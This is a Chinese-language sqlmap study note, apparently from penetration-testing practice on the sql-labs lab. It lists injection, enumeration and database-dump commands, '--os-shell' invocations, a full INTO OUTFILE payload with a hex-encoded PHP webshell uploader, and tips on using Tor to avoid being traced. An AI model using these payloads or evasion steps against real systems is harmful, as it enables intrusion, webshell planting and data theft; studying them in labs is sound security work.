## 第一部分 参数介绍

### 一.选定连接（扫描）对象

#### 1.直连数据库

* **使用场景**：获取到了数据库账户和密码等信息，但是服务器没有开放web服务，可以用于获取webshell
* **命令**：sqlmap.py -d "mysql://root:123456@127.0.0.1:3306/mysql" --os-shell

#### 2.目标url（包括）

* **命令**：sqlmap -u "http:192.168.170.128/sql/Less1?id"

#### 3.从文件读取目标

* **http请求日志文件**：-l --scope="匹配url的正则"，可用于对brupsuite等软件产生的日志文件进行注入,使用--scope可以匹配选定的url
* **sitemap.xml**:-x，sitemap.xml是网站地图文件，如果在渗透目标网站的过程中获取了该文件，可用于注入
* **将文本文件中每一行作为目标**：-m
* **从文本文件读取http请求**：-r，当寻找http头部注入点时可使用
* **使用sqlmap.conf配置文集进行注入**：可以设置几乎所有信息

#### 4.google（其他搜索引擎使用相应语法）批量扫注入

* **使用场景**：利用谷歌语法寻找url大规模自动化注入
* **命令**：TODO

### 二.信息获取

* **banner信息**：--banner,Banner信息，欢迎语，在banner信息中可以得到软件开发商，软件名称、版本、服务类型等信息
* **数据库信息**：--dbs
* **用户信息**：--users
* **指纹信息**：-f，--fingerprint  指纹信息，返回DBMS，操作系统，架构，补丁等信息

### 三.设置http请求头

#### 1.使用不同的http请求方法

* **强制指定某一种方法**：--method=PUT/POST/GET  等 在自动测试过程中，有些方法不会使用，可强制指定使用
* **GET方法**：-u "url?query=" 在url中加上查询部分即可

* **POST方法**：
  * **直接指定表单数据**：--data="id=1&uname=admin&passwd=123&Submit=submit"
  * **从http请求文件中选定**：sqlmap -r "http请求文件" -p 参数名
  * **自动搜索表单**：--forms
    * **指定表单的分隔符**：--param-del=";" 这里会将--data中的；视作分隔符，而不是一般的& 

#### 2.cookie相关

* **手动设置cookie**：--cookie=""
* **从文件中加载cookie**：--load-cookies=”文件路径“   文件是Netscape / wget格式的cookie的文件
* **忽略响应的set-cookie**:--drop-set-cookie
* **利用cookie进行注入**:在注入level>=2时，设置cookie中的参数 -p 参数

#### 3.user-agent相关

​	默认的user-agent会标明自己sqlmap的身份

* **手动设置**：--user-agent=" "
* **从sqlmap提供的文件中随机读取常用的**:--random-agent
* **利用user-agent进行注入**：在Level>=3时会进行user-agent注入检测，设置参数 -p "参数"

#### 4.host

​	默认从url自动获取

* **手动设置**：--host=" "
* **利用host进行注入**：level>=5，-p指定参数

#### 5.referer

* **手动设置**：--referer=""
* **进行注入**：level>=3

#### 6.header

* **手动设置**：--headers=""，每个报文头用分号分隔
* **进行注入**：level>=3

#### 7.http认证

* --auth-type Basic/Digest/NTLM --auth-cred "admin:admin"
  * **Basic**
    * **使用场景**：
    * **网页表现**：
    * **http头部**：
  * Digest
    * **使用场景**：
    * **网页表现**：
    * **http头部**：
  * NTLM
    * **使用场景**：
    * **网页表现**：
    * **http头部**：

#### 8.url encode

* --skip-urlencode 不进行url编码,由于部分后端服务器不规范,有时不能进行url编码

### 四.设置代理

#### 1.http代理

* **手动设置**：--proxy http(s)://ip:端口 --proxy-cred uname:passwd
* **文件读取**：--proxy-file="file"，file中的代理无需全部有效
* **忽略系统的代理**：--ignore-proxy
* **http代理和vpn**：常见的代理有http代理和sock代理，http代理工作在应用层，使用代理后，本该发往服务器的包发给了代理服务器，代理服务器会对数据包的应用层进行解析和重组（有必要的话），而不涉及其他层。代理和vpn是两个概念而非两种技术名词，vpn是加密的，隐私性和匿名性好，但速度稍慢，而代理往往不是；而且vpn常常是全局的，而代理常常是应用级的。

#### 2.tor代理

​	tor的匿名性和ip不断切换的特性，可以使得被攻击者难以追踪到攻击者的位置，而且对一些封禁ip的防御手段十分有用。

* **tor的配置**：下载tor软件包后启动tor服务即，洋葱服务器也可；**注意**：tor不能连接私有地址，也就是说无法进行本地回环测试 Rejecting SOCKS request for anonymous connection to private address [scrubbed]. [15 similar message(s) suppressed in last 1020 seconds]；**tor默认提供的是sock代理而非http代理**，希望启用http代理需运行命令tor --HTTPTunnelPort 端口号，**目前暂不了解有什么方法可以设置默认的http代理端口号**
* **结合ProxyChains**：proxychains可以为任何应用设置一个代理，在/etc/proxychains.conf中可以设置这些代理，使用的命令是proxychains或者proxychains4（两个版本）加上正常运行网络应用的命令，例如proxychains4 apt update或者proxychains4 git clone。在启动tor服务后，可以配置相应的代理，使用tor的匿名访问。**目前咱不了解如何切换不同的代理，使用的方法是使用proxychains -f -p "配置文件" 应用，可以编写多个不同代理的配置文件**
* **设置tor**：--tor ---port=端口号 --tor-type=http/https/sock5 --check-tor

### 五.关于http响应

#### 1.忽略401错误

* --ignore-401 在401出现的情况下仍进行探测

### 六.时间设置

#### 1. sqlmap发包时间

* --delay=时间

#### 2.延时注入延时时间

* --time-sec=时间

#### 3.设置超时

* --timeout=时间:设置连接目标的超时时间,连接超时后连接结束
* --retries=3 超时后重试次数,默认为3

### 八.爆库 爆表

```txt
--dbs 列出所有的数据库
 
--current-db 列出当前数据库
 
--tables 列出当前的表

-D database_name --tables 指定数据库的全部表

-D database_name -T table_name --columns 指定数据表的所有列名

-D database_name -T table_name -C column_name --dump 指定列的内容
```



### .关于注入点

​	cookie、请求头等注点注入方法已经在涉及到http请求头的部分写出。

#### 1.选择注入点

​	常见的情况是sqlmap根据level自动对不同地方的参数进行自动注入，或者-p指定参数进行注入，还有一种不受level限制的方法是 \*，可以在任何地方的参数后（url中 --data中 http请求文件中）加入该符号，sqlmap即会对该参数进行检测。

#### 2.注入点使用随机值

* --randomize=参数名:让选定的参数使用随机值,而非固定值,防止服务器检测到相同参数值频繁请求

## 第二部分 脚本编写实例

### update注入（TODO）

sql-labs Less-17

### insert注入

### delete注入

### 编码

#### 1.base64

base64encode.py是自带的插件

```shell
sqlmap -u "http://localhost/sql/Less-21/"  --level=5 --cookie="uname=admin" -p 'uname' --os-shell --tamper base64encode.py
```



## 第三部分 使用实例（使用场景+命令详解+后端配置）

### 一.通过sqlmap半自动手注

### 二.获取shell

#### 1.-u "url" --os-shell获取shell

```sql
' LIMIT 0,1 INTO OUTFILE '/var/www/tmpulhxi.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777773e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- 
```

上面是sqlmap --os-shell获取shell的payload，后面的十六进制代码解码后就是基于php写的一个木马，LINES TERMINATED BY则是将后面的十六进制代码作为分行符写入

#### 2.-d "url" --os-shehll获取shell

sqlmap直连数据库获取shell的原理是基于UDF提权，[(66条消息) udf提权_GitCloud的博客-CSDN博客](https://blog.csdn.net/qq_43430261/article/details/107258466)
